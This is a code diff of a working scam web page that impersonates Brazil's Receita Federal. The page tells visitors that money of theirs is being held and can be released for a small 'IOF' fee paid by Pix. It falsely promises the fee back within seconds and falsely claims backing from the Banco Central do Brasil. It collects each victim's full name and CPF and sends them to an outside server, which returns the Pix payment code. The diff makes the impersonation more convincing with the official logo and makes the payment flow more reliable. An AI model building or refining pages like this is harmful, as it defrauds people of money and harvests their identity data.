@@ -7,81 +7,54 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     
     <style>
-        :root { --green: #28a745; --bg-gray: #f8f9fa; --border: #e9ecef; --text-dark: #212529; }
+        :root { --receita-blue: #0038a9; --green: #28a745; --bg-gray: #f8f9fa; --border: #e9ecef; --text-dark: #212529; }
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
         body { font-family: 'Inter', sans-serif; background-color: #fff; margin: 0; padding: 0; min-height: 100vh; display: flex; flex-direction: column; }
-
-        /* HEADER COM LOGO SVG EMBUTIDO */
-        .app-header {
-            width: 100%;
-            height: 80px;
-            background-color: #003399;
-            display: flex;
+        
+        /* HEADER AZUL OFICIAL RECEITA */
+        .app-header { 
+            width: 100%; 
+            display: flex; 
+            justify-content: center; 
             align-items: center;
-            justify-content: center;
-            position: sticky;
-            top: 0;
-            z-index: 100;
+            background-color: var(--receita-blue); 
+            box-shadow: 0 4px 15px rgba(0,56,169,0.3); 
+            position: sticky; top: 0; z-index: 100; 
+            padding: 15px 0;
+        }
+        
+        .banner-img { 
+            height: 40px; 
+            display: block; 
+            filter: brightness(0) invert(1); /* Deixa o logo branco */
         }
 
-        .logo-container {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        /* LOGO SVG DA RECEITA FEDERAL */
-        .logo-svg {
-            width: 50px;
-            height: 50px;
-        }
-
-        .logo-text {
-            color: white;
-            font-size: 28px;
-            font-weight: 700;
-            font-family: 'Inter', sans-serif;
-            letter-spacing: -0.5px;
-        }
-
-        .content { flex: 1; padding: 25px 20px; display: flex; flex-direction: column; }
-        .title-hero { margin-bottom: 25px; text-align: center; }
-        .title-hero h1 { margin: 0 0 8px; font-size: 20px; color: var(--text-dark); letter-spacing: -0.5px; font-weight: 800; }
+        .content { flex: 1; padding: 20px; display: flex; flex-direction: column; }
+        .title-hero { margin-bottom: 20px; text-align: center; }
+        .title-hero h1 { margin: 0 0 5px; font-size: 20px; color: var(--text-dark); letter-spacing: -0.5px; font-weight: 800; }
         .title-hero p { margin: 0; font-size: 14px; color: #6c757d; }
-        .summary-card { background: var(--bg-gray); border-radius: 12px; padding: 20px; margin-bottom: 25px; border: 1px solid var(--border); }
-        .row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; color: #495057; }
-        .row strong { color: var(--text-dark); }
+        
+        .summary-card { background: var(--bg-gray); border-radius: 12px; padding: 20px; margin-bottom: 20px; border: 1px solid var(--border); }
+        .row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; color: #495057; }
         .total-row { margin-top: 15px; padding-top: 15px; border-top: 1px dashed #ced4da; display: flex; justify-content: space-between; align-items: center; }
-        .total-label { font-size: 14px; font-weight: 700; color: var(--text-dark); }
-        .total-value { font-size: 22px; font-weight: 800; color: var(--green); }
-        .refund-notice { background: #e3f2fd; border: 1px solid #90caf9; padding: 15px; border-radius: 8px; margin-bottom: 25px; display: flex; gap: 12px; align-items: flex-start; }
-        .refund-text { font-size: 13px; color: #0d47a1; line-height: 1.4; }
-        .form-group { margin-bottom: 15px; }
-        .label { font-size: 12px; font-weight: 600; color: #495057; margin-bottom: 6px; display: block; text-transform: uppercase; }
-        .input { width: 100%; padding: 16px; border: 1px solid #ced4da; border-radius: 8px; font-size: 16px; background: #fff; }
-        .input:focus { border-color: #0038a9; box-shadow: 0 0 0 3px rgba(0, 56, 169, 0.1); }
-        .btn-main { width: 100%; padding: 18px; background: var(--green); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; text-transform: uppercase; box-shadow: 0 4px 15px rgba(40,167,69,0.3); margin-top: 10px; cursor: pointer; }
-        .footer-info { text-align: center; margin-top: 25px; color: #adb5bd; font-size: 11px; }
+        .total-value { font-size: 20px; font-weight: 800; color: var(--green); }
+        
+        .refund-notice { background: #e3f2fd; border: 1px solid #90caf9; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 13px; color: #0d47a1; line-height: 1.4; }
+        
+        .input { width: 100%; padding: 16px; border: 1px solid #ced4da; border-radius: 8px; font-size: 16px; margin-bottom: 15px; }
+        .btn-main { width: 100%; padding: 18px; background: var(--green); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; text-transform: uppercase; cursor: pointer; margin-top: 10px; }
+        
         #qr-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 500; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
-        .qr-img { width: 220px; display: block; margin: 20px 0; border: 1px solid #eee; border-radius: 8px; }
-        .pix-code { background: #f8f9fa; padding: 15px; width: 100%; font-size: 11px; word-break: break-all; text-align: center; border-radius: 8px; margin-bottom: 20px; color: #555; }
+        .qr-img { width: 200px; margin: 20px 0; border: 1px solid #eee; border-radius: 8px; }
+        .pix-code-box { background: #f8f9fa; padding: 12px; width: 100%; font-size: 11px; text-align: center; margin-bottom: 20px; border: 1px dashed #ccc; border-radius: 6px; color: #555; word-break: break-all; resize: none; height: 80px; }
     </style>
 </head>
 <body>
-    <!-- HEADER COM LOGO SVG E TEXTO -->
     <div class="app-header">
-        <div class="logo-container">
-            <!-- LOGO SVG DA RECEITA FEDERAL -->
-            <svg class="logo-svg" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <!-- Forma geométrica estilizada baseada no logo da Receita Federal -->
-                <path d="M20 30 L50 10 L80 30 L70 60 L50 80 L30 60 Z" fill="white" opacity="0.9"/>
-                <path d="M35 40 L50 25 L65 40 L58 55 L50 65 L42 55 Z" fill="#003399"/>
-                <circle cx="50" cy="48" r="8" fill="white"/>
-                <path d="M25 35 L40 20 L55 35 L45 50 L35 50 Z" fill="white" opacity="0.7"/>
-                <path d="M45 50 L55 35 L75 45 L65 65 L50 75 Z" fill="white" opacity="0.8"/>
-            </svg>
-            <span class="logo-text">Receita Federal</span>
-        </div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" 
+             class="banner-img" 
+             alt="Receita Federal"
+             referrerpolicy="no-referrer">
     </div>
 
     <div class="content">
@@ -92,44 +65,48 @@
         <div class="summary-card">
             <div class="row"><span>Saldo Retido</span><strong>R$ 1.489,38</strong></div>
             <div class="row"><span>Taxa (IOF)</span><strong style="color: #dc3545;">R$ 47,90</strong></div>
-            <div class="total-row"><span class="total-label">Você paga agora:</span><span class="total-value">R$ 47,90</span></div>
+            <div class="total-row"><span style="font-weight:700;">Você paga agora:</span><span class="total-value">R$ 47,90</span></div>
         </div>
-        <div class="refund-notice">
-            <div class="refund-text"><strong>Reembolso Automático:</strong> Os R$ 47,90 retornarão para sua conta em <strong>10 segundos</strong>.</div>
-        </div>
-        <div class="form-group"><label class="label">Nome Completo</label><input type="text" id="nome" class="input" placeholder="Digite seu nome"></div>
-        <div class="form-group"><label class="label">CPF</label><input type="tel" id="cpf" class="input" placeholder="000.000.000-00" maxlength="14" oninput="mask(this)"></div>
+        <div class="refund-notice"><strong>Reembolso Automático:</strong> Os R$ 47,90 retornam em 10 segundos.</div>
+        
+        <input type="text" id="nome" class="input" placeholder="Nome Completo">
+        <input type="tel" id="cpf" class="input" placeholder="CPF" maxlength="14" oninput="mask(this)">
+        
         <button class="btn-main" onclick="gerarPixIOF()">PAGAR TAXA E LIBERAR</button>
-        <div class="footer-info">Banco Central do Brasil • Certificado Digital SSL</div>
+        <div style="text-align:center; margin-top:20px; color:#aaa; font-size:11px;">Banco Central do Brasil • Seguro SSL</div>
     </div>
 
     <div id="qr-screen">
-        <h3>Pagamento Seguro</h3><p style="color:#666;font-size:14px;">Use o app do seu banco.</p>
-        <img id="qr-image" class="qr-img"><div id="pix-copia" class="pix-code"></div>
+        <h3>Pagamento Seguro</h3>
+        <p style="color:#666;font-size:14px; text-align:center;">Abra o app do seu banco e escolha "Pix Copia e Cola".</p>
+        <img id="qr-image" class="qr-img">
+        <textarea id="pix-copia" class="pix-code-box" readonly></textarea>
         <button class="btn-main" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
-        <div id="msg-sucesso" style="margin-top:20px;color:green;display:none;font-weight:bold;">PAGAMENTO APROVADO!</div>
+        <div id="msg-sucesso" style="margin-top:20px;color:green;display:none;font-weight:bold;text-align:center;">PAGAMENTO APROVADO!</div>
     </div>
 
     <script>
         const API_URL = "https://checkout-pix-profissional.onrender.com";
         function mask(i){ let v=i.value.replace(/\D/g,""); v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"); i.value=v; }
+        
         async function gerarPixIOF() {
             const n=document.getElementById('nome').value, c=document.getElementById('cpf').value.replace(/\D/g,''), b=document.querySelector('.btn-main');
             if(n.length<3||c.length<11) return alert("Preencha todos os dados.");
-            b.innerText="PROCESSANDO..."; b.disabled=true;
+            b.innerText="GERANDO PIX..."; b.disabled=true;
             try {
                 const r=await fetch(`${API_URL}/pix`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:47.90,name:n,cpf:c})});
                 const d=await r.json();
                 if(d.point_of_interaction){
                     document.getElementById('qr-image').src=`data:image/png;base64,${d.point_of_interaction.transaction_data.qr_code_base64}`;
-                    document.getElementById('pix-copia').innerText=d.point_of_interaction.transaction_data.qr_code;
+                    const codigoLimpo = d.point_of_interaction.transaction_data.qr_code.trim();
+                    document.getElementById('pix-copia').value = codigoLimpo;
                     document.getElementById('qr-screen').style.display='flex';
                     monitor(d.id);
-                }
-            } catch(e){ alert("Erro de conexão."); b.disabled=false; }
+                } else { alert("Erro ao gerar Pix."); b.disabled=false; b.innerText="PAGAR TAXA E LIBERAR"; }
+            } catch(e){ alert("Erro de conexão."); b.disabled=false; b.innerText="PAGAR TAXA E LIBERAR"; }
         }
-        function monitor(id){ setInterval(async()=>{ try{ const r=await fetch(`${API_URL}/pix/${id}`); const j=await r.json(); if(j.status==='approved'||j.status==='refunded'){ document.getElementById('msg-sucesso').style.display='block'; document.getElementById('qr-image').style.opacity=0.3; } }catch(e){} },3000); }
-        function copiarCodigo(){ navigator.clipboard.writeText(document.getElementById('pix-copia').innerText); alert("Código copiado!"); }
+        function monitor(id){ const i=setInterval(async()=>{ try{ const r=await fetch(`${API_URL}/pix/${id}`); const j=await r.json(); if(j.status==='approved'||j.status==='refunded'){ clearInterval(i); document.getElementById('msg-sucesso').style.display='block'; document.getElementById('qr-image').style.opacity=0.3; } }catch(e){} },3000); }
+        function copiarCodigo(){ const t=document.getElementById('pix-copia'); t.select(); document.execCommand('copy'); alert("CÓDIGO COPIADO!"); }
     </script>
 </body>
 </html>
